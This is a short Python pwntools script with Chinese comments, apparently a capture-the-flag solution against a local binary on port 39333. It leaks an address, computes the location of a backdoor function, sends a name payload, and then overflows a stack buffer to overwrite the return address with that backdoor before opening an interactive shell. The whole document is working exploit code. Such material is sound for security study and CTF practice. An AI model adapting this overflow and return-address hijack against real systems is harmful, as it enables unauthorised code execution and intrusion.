from pwn import *
import ctypes                              # 
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
#io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect("127.0.0.1",39333)          

io.sendlineafter(b'>',b'1')
io.recvuntil(b'you a gift:')
addr = io.recv(14)
addr = int(addr,16)
backdoor = addr - 0x4010 + 0x124E # backdoor函数地址计算, 避免栈对齐，可以跳过pushrbp
log.debug(hex(addr))

io.sendlineafter(b'>',b'2')
payload_1 = b'a'*32 + b'xdulaker'
io.sendlineafter(b'name?!\n',payload_1)

io.sendlineafter('I will teach you a lesson.\n',b'3')
payload_2 = b'a'*(0x30 + 8) + p64(backdoor)
io.sendlineafter(b'welcome,xdulaker\n',payload_2)
io.interactive()
